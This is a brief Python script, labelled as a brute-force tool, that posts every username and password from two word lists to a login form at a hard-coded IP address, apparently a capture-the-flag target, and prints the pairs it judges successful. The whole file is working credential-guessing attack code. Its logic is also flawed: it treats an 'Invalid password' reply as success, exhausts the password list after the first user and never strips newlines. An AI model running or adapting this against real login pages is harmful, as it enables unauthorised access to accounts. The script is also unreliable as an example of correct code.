#!/usr/bin/python3
#brute force python
import sys
from requests import post


if len(sys.argv) != 3:
	print('Usage {} userlist passwordlist'.format(sys.argv[0]))
	sys.exit(0)

filenameUserlist = str(sys.argv[1])
filenamePasswordlist = str(sys.argv[2])

userlist = open(filenameUserlist, 'r')

passwordlist = open(filenamePasswordlist, 'r')

url = "http://34.74.105.127/dc7a9c9c82/login"

foundPassword = []

failStr = "Invalid username"

failStr2 = "Invalid password"

for user in userlist:
	for password in passwordlist:
		data = post('http://34.74.105.127/dc7a9c9c82/login', data = {'username':user, 'password':password})
		response = data.text
		if(response.find(failStr2) != -1):
			foundPassword.append(user+":"+password)
			
if len(foundPassword) > 0:
	print("Se ha encontrado un password")
	for name in foundPassword:
		print(name)
else:
	print("No se encontraron passwords")